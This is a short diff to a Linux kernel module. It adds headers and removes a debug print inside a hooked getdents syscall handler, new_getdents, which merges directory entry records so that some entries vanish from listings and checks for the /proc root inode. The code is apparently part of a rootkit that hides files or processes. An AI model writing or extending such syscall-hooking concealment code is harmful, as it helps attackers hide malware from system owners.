@@ -17,6 +17,8 @@
 #include <linux/stat.h>
 #include <linux/namei.h>
 #include <linux/fdtable.h>
+#include <linux/dcache.h>
+#include <linux/path.h>
 
 MODULE_LICENSE("GPL");
 
@@ -122,8 +124,6 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned
             d->d_off=(nd->d_off+d->d_off);
             d->d_reclen=(d->d_reclen+nd->d_reclen);
         }
-        printk("%d",((unsigned long *)current->files->fd_array[fd]->f_path.dentry->d_inode->i_ino)==PROC_ROOT_INO);
-        //nd->d_name file name
         bpos += d->d_reclen; //next
     }
     copy_to_user(dirp,(struct linux_dirent *)buf,sizeof(buf)); //now put it back to userspace
